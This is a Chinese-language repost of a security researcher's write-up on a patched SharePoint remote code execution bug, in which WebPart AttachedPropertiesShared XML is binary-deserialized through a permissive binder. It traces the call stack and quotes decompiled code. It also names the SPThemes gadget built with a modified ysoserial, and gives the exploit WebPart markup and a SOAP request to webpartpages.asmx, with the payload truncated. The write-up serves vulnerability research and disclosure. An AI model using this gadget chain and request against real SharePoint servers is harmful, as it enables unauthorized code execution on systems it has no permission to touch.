> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzAxODM5ODQzNQ==&mid=2247489664&idx=1&sn=305ea1fb540232b04b6188e09fc1fe03

#  未知 CVE 揭秘：通过 WebPart 属性反序列化实现 RCE (Remote Code Execution)  
khoadha  securitainment   2025-07-21 05:37  
  
> SharePoint Unknown CVE Unveiled RCE via WebPart Properties Deserialization SharePoint   
  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCNXHBHVHTf61W4kIgYrbTAvAZdvnwmuKbSelMNmcPBBP4aVA0hOwU8GhFiazWQbzPSU3BxMXNe8vicg/640?wx_fmt=png&from=appmsg "")  
  
免责声明：本文与 Pwn2Own Berlin 的漏洞无关，也不包含相关信息。该漏洞是我偶然发现的，且已被修复。我不清楚它对应的 CVE 编号或修复版本。看起来有人发现并保留该漏洞用于红队测试。如果您了解该漏洞的任何信息，欢迎留言。  
  
如标题所述，该漏洞存在于 WebPart 属性的反序列化过程中。漏洞始于控件解析过程。以下是相应的调用栈：  

```
Microsoft.SharePoint.WebPartPages.WebPart.AddParsedSubObject()
->Microsoft.SharePoint.WebPartPages.WebPart.ParseXml()
-->Microsoft.SharePoint.WebPartPages.WebPart.DoPostDeserializationTasks()
--->Microsoft.SharePoint.WebPartPages.WebPart.PromoteStateIntoAspWebPart()
---->Microsoft.SharePoint.WebPartPages.SPWebPartManager.SetZoneID()
----->Microsoft.SharePoint.WebPartPages.SPAttachedProperties.Get()
------>Microsoft.SharePoint.WebPartPages.SPAttachedProperties.GetProperties()
------->Microsoft.SharePoint.WebPartPages.WebPart.GetAttachedProperties()
-------->Microsoft.SharePoint.WebPartPages.Utility.DeserializeStringToObject()
```

  
要触发 
```
WebPart.AddParsedSubObject()
```

  
方法，只需在 WebPart 控件内添加任意控件、HTML 内容或字符串即可。例如：  

```
<WebPartPages:XmlWebPart ID=&#34;SPWebPartManager&#34; runat=&#34;Server&#34;>
<sometag>some content</sometag>
</WebPartPages:XmlWebPart>
```

  

```
WebPart.AddParsedSubObject()
```

  
方法会获取 
```
LiteralControl
```

  
的文本内容并通过 
```
ParseXml
```

  
进行解析。
```
LiteralControl
```

  
可以是任意 HTML 内容或简单字符串。在上面的示例中，
```
LiteralControl
```

  
是 
```
<sometag>some content</sometag>
```

  
。  

```
protected override void AddParsedSubObject(object obj)
{
 if (obj is LiteralControl literalControl && !_hasParsedLiteralControlDWP)
 {
  string text = literalControl.Text;
  if (text.Trim().Length > 0)
  {
   SPWeb sPWeb;
   ...
   try
   {
                Type type = GetType();
    EmbeddedXmlReader embeddedXmlReader = new EmbeddedXmlReader(new StringReader(text), type, sPWeb);
    WebPart webPartFrom = ParseXml(embeddedXmlReader, type, null, sPWeb);
    if (webPartFrom.UnknownXmlElements.Count > 0)
    {
     foreach (XmlElement unknownXmlElement in webPartFrom.UnknownXmlElements)
     {
      if (unknownXmlElement.NamespaceURI == &#34;http://schemas.microsoft.com/WebPart/v2&#34; && (string.Compare(unknownXmlElement.Name, &#34;Assembly&#34;, ignoreCase: true, CultureInfo.InvariantCulture) == 0 || string.Compare(unknownXmlElement.Name, &#34;TypeName&#34;, ignoreCase: true, CultureInfo.InvariantCulture) == 0))
      {
       throw new WebPartPageUserException(WebPartPageResource.GetString(&#34;InvalidWebPartTag&#34;));
      }
     }
    }
    InheritProperties(webPartFrom, embeddedXmlReader.PropertyNames);
    _hasParsedLiteralControlDWP = true;
    return;
   }
                    ...
  }
 }
 base.AddParsedSubObject(obj);
}
```

  

```
WebPart.ParseXml()
```

  
将通过 
```
XmlSerializer
```

  
反序列化该 WebPart 类型，然后执行 
```
DoPostDeserializationTasks
```

  
任务  

```
internal static WebPart ParseXml(XmlReader reader, Type type, string[] links, SPWeb spWeb)
{
 if (!type.IsSubclassOf(typeof(WebPart)))
 {
  throw new WebPartPageUserException(WebPartPageResource.GetString(&#34;NotAWebPart&#34;, type.FullName, typeof(WebPart).FullName));
 }
 try
 {
  TypeCacheEntry tce = spWeb.TypeCache[type, spWeb?.IsAppWeb ?? false, false];
  XmlSerializer xmlSerializer = tce.XmlSerializer;
  WebPart webPart = (WebPart)xmlSerializer.Deserialize(reader);
  if (webPart != null)
  {
   SPWebPartManager webPartManager = spWeb.WebPartManager;
   DoPostDeserializationTasks(webPart, webPartManager, links, tce);
  }
  return webPart;
 }
 ...
}


```

  
在 
```
WebPart.GetAttachedProperties()
```

  
方法中，SharePoint 会使用 
```
Utility
```

  
类并通过 
```
SPSerializationBinder
```

  
绑定器对 
```
_serializedAttachedPropertiesShared
```

  
进行反序列化 (deserialization)  

```
internal IDictionary GetAttachedProperties()
{
 if (_attachedProperties == null)
 {
  int num = 0;
  int num2 = 0;
  ArrayList arrayList = null;
  ArrayList arrayList2 = null;
  if (_serializedAttachedPropertiesShared != null || _serializedAttachedPropertiesUser != null)
  {
   if (WebPartManager != null)
   {
    SPSerializationBinderBase sPSerializationBinderBase = new SPSerializationBinder(WebPartManager);
    if (_serializedAttachedPropertiesShared != null)
    {
     arrayList = (ArrayList)Utility.DeserializeStringToObject(sPSerializationBinderBase, _serializedAttachedPropertiesShared);
     num = arrayList.Count;
    }
    if (_serializedAttachedPropertiesUser != null)
    {
     arrayList2 = (ArrayList)Utility.DeserializeStringToObject(sPSerializationBinderBase, _serializedAttachedPropertiesUser);
     num2 = arrayList2.Count;
    }
   }
   else
   {
    ULS.SendTraceTag(3981539U, ULSCat.msoulscat_WSS_WebParts, ULSTraceLevel.Unexpected, &#34;WebPartManager is NULL when initializing GetAttachedProperties&#34;);
   }
  }
  ...
 return _attachedProperties;
}


```

  

```
_serializedAttachedPropertiesShared
```

  
字段可以通过 XML 反序列化过程中的 
```
AttachedPropertiesShared
```

  
元素进行设置。  

```
[Browsable(false)]
[DefaultValue(null)]
[DesignerSerializationVisibility(DesignerSerializationVisibility.Hidden)]
[WebPartStorage(Storage.Shared)]
[XmlElement(&#34;AttachedPropertiesShared&#34;)]
public string SerializedAttachedPropertiesShared
{
 get
 {
  return _serializedAttachedPropertiesShared;
 }
 set
 {
  _serializedAttachedPropertiesShared = value;
 }
}
```

  

```
Utility
```

  
类使用 
```
SPObjectStateFormatter
```

  
，这是 SharePoint 版本的 
```
ObjectStateFormatter
```

  
。它最终会调用 
```
BinaryFormatter
```

  
进行反序列化。  

```
internal static object DeserializeByteArrayToObject(SPSerializationBinderBase binder, byte[] bytes)
{
 if (bytes == null || bytes.Length == 0)
 {
  return null;
 }
 IFormatter formatter = new SPObjectStateFormatter();
 formatter.Binder = binder;
 return formatter.Deserialize(new MemoryStream(bytes));
}
```

  
当前我们重点关注 
```
SPSerializationBinder
```

  
反序列化绑定器，让我们看看它允许哪些操作。  

```
protected override void IsAllowedType(Type type)
{
 string text;
 if (!(null != type) || this.m_safeControls == null || type.IsEnum || this.m_safeControls.IsSafeControl(this.m_isAppWeb, type, out text))
 {
  return;
 }
 if (base.ControlCompatMode)
 {
  ULS.SendTraceTag(3981589U, ULSCat.msoulscat_WSS_WebParts, ULSTraceLevel.High, &#34;Allowing ControlCompatMode=true object in ObjectFormatter. Type = {0}&#34;, new object[] { type.AssemblyQualifiedName });
  return;
 }
 ULS.SendTraceTag(3981590U, ULSCat.msoulscat_WSS_WebParts, ULSTraceLevel.High, &#34;Allowing ControlCompatMode=false object in ObjectFormatter. Type = {0}&#34;, new object[] { type.AssemblyQualifiedName });
 throw new SafeControls.UnsafeControlException(SPResource.GetString(&#34;UnsafeControlPageParserFilterError&#34;, new object[]
 {
  type.FullName,
  (text == null) ? string.Empty : text
 }));
}
```

  
该漏洞允许对 SafeControls 中的任何类进行二进制反序列化 (binary deserialization)!!!  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCNXHBHVHTf61W4kIgYrbTAvhrH8VfBic4EQ9geiayNliclGHgk2xqIKuMd2dh3ibico7zdJcEXibELF8Qvw/640?wx_fmt=png&from=appmsg "")  
  
在未打补丁的 SharePoint 版本中，我们可以利用 
```
Microsoft.SharePoint.ApplicationPages.SPThemes
```

  
类来触发此漏洞 (exploit this bug)。  

```
namespace Microsoft.SharePoint.ApplicationPages
{
 [DesignerCategory(&#34;code&#34;)]
 [Serializable]
 public sealed class SPThemes : DataSet
 {
  public SPThemes()
  {
   InitClass();
  }


  private SPThemes(SerializationInfo info, StreamingContext context)
   : base(info, context)
  {
   InitClass();
   GetSerializationData(info, context);
  }
        ...
}
```

  

```
SPThemes
```

  
类实现了 
```
DataSet
```

  
并使用其序列化构造函数。我们可以直接使用 ysoserial 工具，修改 
```
DataSetMarshal
```

  
，将类型从 
```
DataSet
```

  
改为 
```
Microsoft.SharePoint.ApplicationPages.SPThemes
```

  
，然后创建一个无参构造函数并手动设置 
```
_fakeTable
```

  
。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCNXHBHVHTf61W4kIgYrbTAvCWWPowUia3k4ciaZU6ercnxams4CP9lhgqWMa7ibbf2GvnM613HMc8rNw/640?wx_fmt=png&from=appmsg "")  
  
由于 
```
SPObjectStateFormatter
```

  
是内部类，我们可以通过反射调用其 
```
Serialize()
```

  
方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCNXHBHVHTf61W4kIgYrbTAv7icsA6jjn6ICIop7ho6O7et30iaZW4CYA9soRWiaM0lpyj5IA3nltzn5g/640?wx_fmt=png&from=appmsg "")  
  
最后，使用 
```
WebPartPages
```

  
服务的端点来解析控件，或者创建一个包含该 WebPart 的页面。最终的 WebPart 将类似于以下结构：  

```
<%@ Register Tagprefix=&#34;WebPartPages&#34; Namespace=&#34; Microsoft.SharePoint.WebPartPages&#34; Assembly=&#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&#34; %>


<WebPartPages:XmlWebPart ID=&#34;SPWebPartManager&#34; runat=&#34;Server&#34;>
    <WebPart
        xmlns=&#34;http://schemas.microsoft.com/WebPart/v2&#34;>
        <AttachedPropertiesShared>/wEWABANANA...</AttachedPropertiesShared>
    </WebPart>
</WebPartPages:XmlWebPart>
```

  
请求：  

```
POST /_vti_bin/webpartpages.asmx HTTP/1.1
Host: sharepoint
Content-Type: text/xml; charset=utf-8
Content-Length: 9661
SOAPAction: http://microsoft.com/sharepoint/webpartpages/ConvertWebPartFormat


<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<soap:Envelope xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;><soap:Body><ConvertWebPartFormat xmlns=&#34;http://microsoft.com/sharepoint/webpartpages&#34;><inputFormat><![CDATA[
<%@ Register Tagprefix=&#34;WebPartPages&#34; Namespace=&#34; Microsoft.SharePoint.WebPartPages&#34; Assembly=&#34;Microsoft.SharePoint, Version=15.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&#34; %>


<WebPartPages:XmlWebPart ID=&#34;SPWebPartManager&#34; runat=&#34;Server&#34;>
    <WebPart
        xmlns=&#34;http://schemas.microsoft.com/WebPart/v2&#34;>
        <AttachedPropertiesShared>/wEWABANANA...</AttachedPropertiesShared>
    </WebPart>
</WebPartPages:XmlWebPart>


]]></inputFormat></ConvertWebPartFormat></soap:Body></soap:Envelope>
```

  
测试版本：15.0.5145.1000  
  
以上就是本篇博客的全部内容。感谢您的阅读！  
  
